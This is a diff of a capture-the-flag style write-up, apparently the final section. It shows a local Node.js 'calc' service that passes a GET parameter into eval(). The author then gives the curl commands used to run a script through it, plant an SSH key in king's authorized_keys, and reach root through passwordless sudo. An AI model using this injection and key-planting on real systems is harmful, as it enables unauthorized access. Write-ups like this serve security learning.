@@ -64,19 +64,35 @@ With SSH access, we are in the endgame. All that is left is to poke around until
 
 Specifically, the code we're interested in looks like this:
 
-~~~function calc(pathname, request, query, response)
+```
+function calc(pathname, request, query, response)
 {
         sum = query.split('=')[1];
         console.log(sum)
         response.writeHead(200, {"Content-Type": "text/plain"});
 
         response.end(eval(sum).toString());
-}~~~
+}
+```
 
-If we can get king to run this file, we can probably leverage it for code execution.
+It's very simple: whatever gets passed as a GET paramet is fed directly into eval(). If we can get king to run this file, we can probably leverage it for code execution.
 
 As it turned out, we don't need to "get king to run this file" - it's already running. A simple `netstat -antp` revealed that port 8888 is already listening; it's just not accessible to the outside world. That's not a problem for us, though, since we already have SSH access to the server. I confirmed it was working from the `rails` account with a simple curl command:
 
 `curl http://127.0.0.1:8888/calc?sum=5-5`
 
-This returned 0, as we would expect it to. All that is left is to craft a
+This returned 0, as we would expect it to. All that is left is to craft an exploit. For whatever reason, I found that it didn't like any spaces in its input, but this was easy enough to circumvent:
+
+```
+$ echo "touch /tmp/test.txt" > /tmp/king.sh
+$ chmod +x /tmp/king.hs
+$ curl "http://127.0.0.1:8888/calc?sum=exec('/tmp/king.sh')"
+```
+
+Checking the contents of `/tmp` confirmed that my code had executed. I was able to use `king.sh` to get my public key copied into `/home/king/.ssh/authorized_keys`. This allowed me to login as `king`. Since `king` has passwordless sudo access, this directly enabled me to escalate to root.
+
+Here is the contents of the flag file, for proof:
+
+>! c0db34ce8adaa7c07d064cc1697e3d7cb8aec9d5a0c4809d5a0c4809b6be23044d15379c5
+
+## Afterword
